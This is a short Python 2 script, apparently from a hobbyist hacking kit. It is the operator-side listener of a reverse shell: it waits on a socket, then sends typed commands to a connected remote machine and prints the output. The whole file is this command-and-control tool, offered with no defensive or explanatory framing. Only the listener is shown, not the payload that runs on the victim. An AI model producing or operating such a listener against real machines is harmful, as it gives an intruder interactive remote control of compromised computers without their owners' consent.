#!/usr/bin/env python

# Created by un4ckn0wl3z-level99
# Website -> www.un4ckn0wl3z.xyz
# Date -> 7/28/2018

import socket

class Listener:
    def __init__(self,ip,port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print "[+] Waiting for incoming connection"
        self.connection, address = listener.accept()
        print "[+] Got a connection from " + str(address)
        result = self.connection.recv(1024)
        print result

    def exec_remote(self,cmd):
        self.connection.send(cmd)
        return self.connection.recv(1024)

    def run(self):
        while True:
            cmd = raw_input(">> ")
            if not cmd:
                continue
            result = self.exec_remote(cmd)
            print result


listener = Listener("127.0.0.1",2508)
listener.run()

